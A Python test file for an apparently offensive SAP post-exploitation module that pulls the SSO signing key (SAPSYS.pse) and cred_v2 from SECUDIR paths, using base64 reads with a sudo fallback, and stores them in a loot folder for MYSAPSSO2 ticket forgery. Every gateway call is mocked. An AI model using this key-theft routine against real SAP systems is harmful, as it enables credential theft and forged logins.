#!/usr/bin/env python3
"""Tests for the PSE extraction primitive (commit 1 of the
MYSAPSSO2 ticket-forgery series).

Pure-Python — no live SAP needed.  Every test uses a mocked
gw_exec_fn that returns canned (program, args) -> {success, output,
error} responses.
"""
from __future__ import annotations

import base64
import os
import sys

import pytest

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "modules",
                                "postex"))
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "modules",
                                "core"))


# ===========================================================================
# A pluggable fake gw_exec_fn
# ===========================================================================

def _make_fake_gw(filesystem):
    """Build a gw_exec_fn that simulates `ls`, `base64`, `sudo`, `whoami`
    against an in-memory filesystem dict.

    filesystem = {
        "/path/dir": [list of filenames],          # for ls
        "/path/file": b"contents",                  # for base64
        "_whoami": "s4hadm",                         # whoami output
        "_sudo_files": {"/path/file": b"contents"}, # files only readable via sudo
    }
    """
    calls = []

    def gw_exec(program, args):
        calls.append((program, args))
        program = (program or "").strip()
        args = (args or "").strip()

        if program == "whoami":
            who = filesystem.get("_whoami")
            if who is None:
                return {"success": False, "output": [], "error": "no whoami"}
            return {"success": True, "output": [who], "error": ""}

        if program == "ls":
            files = filesystem.get(args)
            if files is None:
                return {"success": False,
                        "output": ["ls: cannot access '" + args
                                    + "': No such file or directory"],
                        "error": ""}
            return {"success": True, "output": files, "error": ""}

        if program == "base64":
            data = filesystem.get(args)
            if data is None:
                return {"success": True,
                        "output": ["base64: " + args + ": No such file"],
                        "error": ""}
            b64 = base64.b64encode(data).decode("ascii")
            # base64 coreutils wraps at 76 cols
            chunks = [b64[i:i + 76] for i in range(0, len(b64), 76)]
            return {"success": True, "output": chunks, "error": ""}

        if program == "sudo":
            # args is "base64 /some/path"
            if not args.startswith("base64 "):
                return {"success": False, "output": [], "error": ""}
            path = args[len("base64 "):]
            sudo_files = filesystem.get("_sudo_files", {})
            data = sudo_files.get(path) or filesystem.get(path)
            if data is None:
                return {"success": True,
                        "output": ["sudo: a password is required"],
                        "error": ""}
            b64 = base64.b64encode(data).decode("ascii")
            chunks = [b64[i:i + 76] for i in range(0, len(b64), 76)]
            return {"success": True, "output": chunks, "error": ""}

        return {"success": False, "output": [], "error": "unknown program"}

    gw_exec.calls = calls
    return gw_exec


# ===========================================================================
# SECUDIR path resolution
# ===========================================================================

def test_instance_secudir_layout():
    from sap_pse_loot import _instance_secudir
    assert _instance_secudir("S4H", "D00") == "/usr/sap/S4H/D00/sec"
    assert _instance_secudir("s4h", "D00") == "/usr/sap/S4H/D00/sec", (
        "SID must be uppercased to match /usr/sap convention")
    assert (_instance_secudir("PRD", "DVEBMGS01")
            == "/usr/sap/PRD/DVEBMGS01/sec"), (
        "Non-trivial instance dir names must pass through verbatim")


def test_global_secudir_layout():
    from sap_pse_loot import _global_secudir
    assert (_global_secudir("S4H")
            == "/usr/sap/S4H/SYS/global/security/data")


def test_candidate_secudirs_ordering():
    """Per-instance must be tried BEFORE global -- it's the layout
    that's specific to the dispatcher we have OS-exec on."""
    from sap_pse_loot import candidate_secudirs
    cands = candidate_secudirs("S4H", "D00")
    assert len(cands) == 2
    assert cands[0] == "/usr/sap/S4H/D00/sec"
    assert cands[1] == "/usr/sap/S4H/SYS/global/security/data"


# ===========================================================================
# Shell-line interpretation helpers
# ===========================================================================

@pytest.mark.parametrize("text,expected", [
    ("",                                           False),
    ("AAAAAAAAAAAAAAAA",                            False),
    ("base64: /tmp/x: No such file or directory",   True),
    ("sudo: a password is required",                True),
    ("[sudo] password for s4hadm:",                 True),
    ("Permission denied",                           True),
    ("ls: cannot open /etc/sec/SAPSYS.pse: Is a directory", True),
    ("AAAAAAAAAAcannot open foo",                   True),
])
def test_looks_like_error(text, expected):
    from sap_pse_loot import _looks_like_error
    assert _looks_like_error(text) is expected


def test_decode_b64_lines_concatenates_and_decodes():
    from sap_pse_loot import _decode_b64_lines
    original = bytes(range(256))
    b64 = base64.b64encode(original).decode("ascii")
    # Split into 76-char lines like coreutils
    lines = [b64[i:i + 76] for i in range(0, len(b64), 76)]
    decoded = _decode_b64_lines(lines)
    assert decoded == original


def test_decode_b64_lines_empty_returns_empty_bytes():
    from sap_pse_loot import _decode_b64_lines
    assert _decode_b64_lines([]) is None  # no lines = no read attempted
    assert _decode_b64_lines(["   ", ""]) == b""


def test_decode_b64_lines_garbage_returns_none():
    """Invalid base64 (e.g. picked up an error line) returns None,
    not garbage bytes."""
    from sap_pse_loot import _decode_b64_lines
    assert _decode_b64_lines(["No such file or directory"]) is None


# ===========================================================================
# _read_file_b64
# ===========================================================================

def test_read_file_b64_happy_path():
    """File exists, base64 returns clean output, no sudo retry."""
    from sap_pse_loot import _read_file_b64
    test_bytes = b"hello world\x00\x01\xff"
    gw = _make_fake_gw({"/tmp/x": test_bytes})
    r = _read_file_b64(gw, "/tmp/x")
    assert r["success"] is True
    assert r["bytes"] == test_bytes
    # Should be exactly one base64 call (no sudo retry)
    assert len([c for c in gw.calls if c[0] == "base64"]) == 1
    assert len([c for c in gw.calls if c[0] == "sudo"]) == 0


def test_read_file_b64_missing_file_returns_failure():
    from sap_pse_loot import _read_file_b64
    gw = _make_fake_gw({})
    r = _read_file_b64(gw, "/tmp/nope")
    assert r["success"] is False
    assert "No such file" in r["error"]


def test_read_file_b64_sudo_fallback():
    """Plain base64 hits 'permission denied' (we fake this by NOT
    putting the file in the filesystem dict for base64, but putting
    it in _sudo_files for sudo retrieval).  The function should
    fall back to sudo and succeed."""
    from sap_pse_loot import _read_file_b64
    test_bytes = b"hardened PSE bytes"
    gw = _make_fake_gw({
        "_sudo_files": {"/tmp/x": test_bytes},
    })
    r = _read_file_b64(gw, "/tmp/x")
    assert r["success"] is True
    assert r["bytes"] == test_bytes
    # Sudo retry must have happened
    assert any(c[0] == "sudo" for c in gw.calls)


def test_read_file_b64_disable_sudo_retry():
    """With try_sudo=False, the function gives up on the first
    failure -- used in tests / contexts where we don't want to
    invoke sudo."""
    from sap_pse_loot import _read_file_b64
    gw = _make_fake_gw({"_sudo_files": {"/tmp/x": b"abc"}})
    r = _read_file_b64(gw, "/tmp/x", try_sudo=False)
    assert r["success"] is False
    assert not any(c[0] == "sudo" for c in gw.calls)


# ===========================================================================
# _list_dir
# ===========================================================================

def test_list_dir_returns_names():
    from sap_pse_loot import _list_dir
    gw = _make_fake_gw({
        "/usr/sap/S4H/D00/sec": ["SAPSYS.pse", "cred_v2", "SAPSSLS.pse"],
    })
    files = _list_dir(gw, "/usr/sap/S4H/D00/sec")
    assert set(files) == {"SAPSYS.pse", "cred_v2", "SAPSSLS.pse"}


def test_list_dir_missing_returns_empty():
    from sap_pse_loot import _list_dir
    gw = _make_fake_gw({})
    assert _list_dir(gw, "/tmp/nope") == []


# ===========================================================================
# extract_pse_bundle — end-to-end
# ===========================================================================

def test_extract_bundle_happy_path_instance_secudir(tmp_path,
                                                       monkeypatch):
    """The canonical case: per-instance SECUDIR has both SAPSYS.pse
    and cred_v2.  Function returns both byte blobs and saves to
    loot dir."""
    # Use tmp_path as a fake PROJECT_ROOT so the loot save doesn't
    # touch the real loot directory.
    import sapmap_state
    monkeypatch.setattr(sapmap_state, "LOOT_DIR",
                        os.path.join(tmp_path, "loot"))
    pse_bytes = b"\x06\x09" + b"\x00" * 300  # fake PSE-ish blob
    cred_bytes = b"\x30\x82" + b"\x01" * 100  # fake cred_v2-ish ASN.1

    gw = _make_fake_gw({
        "_whoami": "s4hadm",
        "/usr/sap/S4H/D00/sec": ["SAPSYS.pse", "cred_v2"],
        "/usr/sap/S4H/D00/sec/SAPSYS.pse": pse_bytes,
        "/usr/sap/S4H/D00/sec/cred_v2": cred_bytes,
    })

    from sap_pse_loot import extract_pse_bundle
    r = extract_pse_bundle(gw, "S4H", instance_dir="D00",
                            label="S4H")
    assert r["success"] is True
    assert r["pse_bytes"] == pse_bytes
    assert r["cred_v2_bytes"] == cred_bytes
    assert r["secudir"] == "/usr/sap/S4H/D00/sec"
    assert r["sidadm_user"] == "s4hadm"
    assert r["error"] == ""
    # Loot saved
    assert "/loot/pse/S4H_" in r["loot_path"]
    assert os.path.exists(
        os.path.join(r["loot_path"], "SAPSYS.pse"))
    assert os.path.exists(
        os.path.join(r["loot_path"], "cred_v2"))
    with open(os.path.join(r["loot_path"], "SAPSYS.pse"), "rb") as f:
        assert f.read() == pse_bytes


def test_extract_bundle_falls_back_to_global_secudir(tmp_path,
                                                       monkeypatch):
    """When per-instance SECUDIR is empty (HA layout where the
    instance dir is a symlink that doesn't exist on this node),
    the function falls back to the global path."""
    import sapmap_state
    monkeypatch.setattr(sapmap_state, "LOOT_DIR",
                        os.path.join(tmp_path, "loot"))
    gw = _make_fake_gw({
        "_whoami": "s4hadm",
        # Per-instance: returns empty / not found
        # (no entry in the dict)
        "/usr/sap/S4H/SYS/global/security/data":
            ["SAPSYS.pse", "cred_v2"],
        "/usr/sap/S4H/SYS/global/security/data/SAPSYS.pse": b"GLOBAL",
        "/usr/sap/S4H/SYS/global/security/data/cred_v2": b"CGLOBAL",
    })
    from sap_pse_loot import extract_pse_bundle
    r = extract_pse_bundle(gw, "S4H", instance_dir="D00",
                            label="S4H", save_loot=False)
    assert r["success"] is True
    assert r["secudir"] == "/usr/sap/S4H/SYS/global/security/data"
    assert r["pse_bytes"] == b"GLOBAL"
    assert r["cred_v2_bytes"] == b"CGLOBAL"


def test_extract_bundle_no_pse_found_returns_error():
    """Neither candidate SECUDIR contains SAPSYS.pse -- typical
    non-ABAP host or a hardened install where the PSE has been
    moved.  Function returns success=False with a clear error."""
    gw = _make_fake_gw({
        "_whoami": "s4hadm",
        "/usr/sap/S4H/D00/sec": ["SAPSSLS.pse", "SAPSSLC.pse"],
        "/usr/sap/S4H/SYS/global/security/data": [],
    })
    from sap_pse_loot import extract_pse_bundle
    r = extract_pse_bundle(gw, "S4H", instance_dir="D00",
                            save_loot=False)
    assert r["success"] is False
    assert "no SECUDIR with SAPSYS.pse" in r["error"]


def test_extract_bundle_pse_without_cred_v2_still_succeeds():
    """SAPSYS.pse found but cred_v2 absent -- the function still
    returns the PSE bytes (operator can supply PIN manually).
    success=True with cred_v2_bytes=None."""
    gw = _make_fake_gw({
        "_whoami": "s4hadm",
        "/usr/sap/S4H/D00/sec": ["SAPSYS.pse"],
        "/usr/sap/S4H/D00/sec/SAPSYS.pse": b"PSE",
    })
    from sap_pse_loot import extract_pse_bundle
    r = extract_pse_bundle(gw, "S4H", instance_dir="D00",
                            save_loot=False)
    assert r["success"] is True
    assert r["pse_bytes"] == b"PSE"
    assert r["cred_v2_bytes"] is None


def test_extract_bundle_records_other_files():
    """Non-SAPSYS / non-cred files in SECUDIR are surfaced as
    `other_files` so the operator can spot unusual PSE names
    (e.g. SAPSYS_ABAP.pse, SAPSYS_PROD.pse).  Out of scope for
    automatic retrieval but visible."""
    gw = _make_fake_gw({
        "_whoami": "s4hadm",
        "/usr/sap/S4H/D00/sec": ["SAPSYS.pse", "cred_v2",
                                   "SAPSSLS.pse", "SAPSSLC.pse",
                                   "weird_custom.pse"],
        "/usr/sap/S4H/D00/sec/SAPSYS.pse": b"PSE",
        "/usr/sap/S4H/D00/sec/cred_v2": b"CR",
    })
    from sap_pse_loot import extract_pse_bundle
    r = extract_pse_bundle(gw, "S4H", instance_dir="D00",
                            save_loot=False)
    assert r["success"] is True
    assert "weird_custom.pse" in r["other_files"]
    assert "SAPSSLS.pse" in r["other_files"]
    assert "SAPSYS.pse" not in r["other_files"]


def test_extract_bundle_explicit_secudir_override():
    """Caller can pass secudir=... to skip auto-discovery -- useful
    when the operator knows the install uses a non-standard layout."""
    gw = _make_fake_gw({
        "_whoami": "s4hadm",
        "/opt/sap/sec": ["SAPSYS.pse", "cred_v2"],
        "/opt/sap/sec/SAPSYS.pse": b"P",
        "/opt/sap/sec/cred_v2": b"C",
    })
    from sap_pse_loot import extract_pse_bundle
    r = extract_pse_bundle(gw, "S4H", instance_dir="D00",
                            secudir="/opt/sap/sec", save_loot=False)
    assert r["success"] is True
    assert r["secudir"] == "/opt/sap/sec"
    # Standard paths must NOT have been queried -- explicit override
    ls_calls = [c for c in gw.calls if c[0] == "ls"]
    paths = [c[1] for c in ls_calls]
    assert "/usr/sap/S4H/D00/sec" not in paths


def test_extract_bundle_whoami_failure_falls_back():
    """When whoami fails entirely, the function uses the
    `<sid>adm` convention as a fallback -- this is required for
    cred_v2 decryption in commit 2 (the OS user name is part of
    the key-derivation input)."""
    gw = _make_fake_gw({
        # _whoami absent -- whoami returns failure
        "/usr/sap/S4H/D00/sec": ["SAPSYS.pse"],
        "/usr/sap/S4H/D00/sec/SAPSYS.pse": b"P",
    })
    from sap_pse_loot import extract_pse_bundle
    r = extract_pse_bundle(gw, "S4H", instance_dir="D00",
                            save_loot=False)
    assert r["sidadm_user"] == "s4hadm"


def test_extract_bundle_uppercases_sid_in_paths():
    """Lowercase sid arg must still match the uppercase
    /usr/sap/<SID>/ convention."""
    gw = _make_fake_gw({
        "_whoami": "s4hadm",
        "/usr/sap/S4H/D00/sec": ["SAPSYS.pse"],
        "/usr/sap/S4H/D00/sec/SAPSYS.pse": b"P",
    })
    from sap_pse_loot import extract_pse_bundle
    r = extract_pse_bundle(gw, "s4h", instance_dir="D00",
                            save_loot=False)
    assert r["success"] is True
    assert "/usr/sap/S4H/" in r["secudir"]


# ===========================================================================
# Loot dir handling
# ===========================================================================

def test_save_to_loot_creates_meta_file(tmp_path, monkeypatch):
    """The _save_to_loot helper writes a _meta.txt with provenance
    info -- so the operator (or a later SAPMAP run) can see where
    the bytes came from."""
    import sapmap_state
    monkeypatch.setattr(sapmap_state, "LOOT_DIR",
                        os.path.join(tmp_path, "loot"))
    from sap_pse_loot import _save_to_loot
    bundle = {
        "pse_bytes": b"PSE_DATA",
        "cred_v2_bytes": b"CRED_DATA",
        "secudir": "/usr/sap/S4H/D00/sec",
        "sidadm_user": "s4hadm",
        "other_files": ["SAPSSLS.pse", "SAPSSLC.pse"],
    }
    r = _save_to_loot(bundle, "S4H")
    assert r["saved"] is True
    meta_path = os.path.join(r["loot_path"], "_meta.txt")
    assert os.path.exists(meta_path)
    with open(meta_path) as f:
        meta = f.read()
    assert "S4H" in meta
    assert "s4hadm" in meta
    assert "/usr/sap/S4H/D00/sec" in meta
    assert "SAPSSLS.pse" in meta  # other_files surfaced
